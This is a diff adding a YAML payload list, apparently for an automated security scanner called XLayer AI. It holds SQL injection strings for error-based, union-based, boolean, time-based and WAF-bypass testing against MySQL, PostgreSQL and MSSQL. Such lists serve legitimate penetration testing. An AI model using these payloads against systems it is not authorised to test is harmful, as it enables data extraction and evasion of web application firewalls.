@@ -1,0 +1,81 @@
+# XLayer AI - SQL Injection Payloads
+
+error_based:
+  - payload: "'"
+    description: "Single quote"
+    tags: [basic, error]
+  
+  - payload: '"'
+    description: "Double quote"
+    tags: [basic, error]
+  
+  - payload: "' OR '1'='1"
+    description: "OR true condition"
+    tags: [basic, error]
+  
+  - payload: "' OR '1'='1'--"
+    description: "OR true with comment"
+    tags: [basic, error]
+
+union_based:
+  mysql:
+    - payload: "' UNION SELECT NULL--"
+      description: "Union 1 column"
+    - payload: "' UNION SELECT NULL,NULL--"
+      description: "Union 2 columns"
+    - payload: "' UNION SELECT version(),user(),database()--"
+      description: "MySQL info extraction"
+  
+  postgresql:
+    - payload: "' UNION SELECT NULL--"
+      description: "Union 1 column"
+    - payload: "' UNION SELECT version(),current_user,current_database()--"
+      description: "PostgreSQL info extraction"
+  
+  mssql:
+    - payload: "' UNION SELECT NULL--"
+      description: "Union 1 column"
+    - payload: "' UNION SELECT @@version,SYSTEM_USER,DB_NAME()--"
+      description: "MSSQL info extraction"
+
+boolean_based:
+  - payload: "' AND '1'='1"
+    description: "Boolean true"
+    expected: "same_as_original"
+  
+  - payload: "' AND '1'='2"
+    description: "Boolean false"
+    expected: "different_from_original"
+
+time_based:
+  mysql:
+    - payload: "' AND SLEEP(5)--"
+      description: "MySQL sleep 5s"
+      delay_seconds: 5
+    
+    - payload: "' AND BENCHMARK(10000000,MD5(1))--"
+      description: "MySQL benchmark"
+      delay_seconds: 5
+  
+  postgresql:
+    - payload: "'; SELECT pg_sleep(5)--"
+      description: "PostgreSQL sleep 5s"
+      delay_seconds: 5
+  
+  mssql:
+    - payload: "'; WAITFOR DELAY '0:0:5'--"
+      description: "MSSQL delay 5s"
+      delay_seconds: 5
+
+waf_bypass:
+  - payload: "' UNION/**/SELECT/**/NULL--"
+    description: "Comment bypass"
+    tags: [bypass]
+  
+  - payload: "' UnIoN SeLeCt NULL--"
+    description: "Case variation"
+    tags: [bypass]
+  
+  - payload: "'%20UNION%20SELECT%20NULL--"
+    description: "URL encoded spaces"
+    tags: [bypass]
